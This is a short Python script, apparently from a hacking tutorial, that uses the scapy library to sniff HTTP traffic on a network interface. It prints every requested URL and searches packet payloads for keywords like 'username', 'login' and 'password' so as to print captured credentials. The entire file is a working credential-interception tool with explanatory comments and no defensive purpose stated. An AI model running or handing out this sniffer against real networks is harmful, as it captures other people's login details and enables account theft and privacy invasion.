import scapy.all as scapy
from scapy.layers import http#scapy doesn't have http filter by default

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)#store argument to false does not store the packets in the memory to not create overload, prn argument runs the function whenevr it receives a packet


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path#url=host(domain name)+path
        print("[+]HTTP request>>"+url)
        if packet.haslayer(scapy.Raw):#raw layer shows theusername,password
            #print(packet.show)#to know the layers and field
            load = packet[scapy.Raw].load#load prints only load field of raw layer,[scapy.raw] for specific layer
            keywords=["username","user","uname","login","email","password","pass"]
            for keyword in keywords:
                if keyword in load:
                    print("\n\n")
                    print("[+]Possible username/password >>" +load+"\n\n")
                    break



sniff("eth0")#network connected interface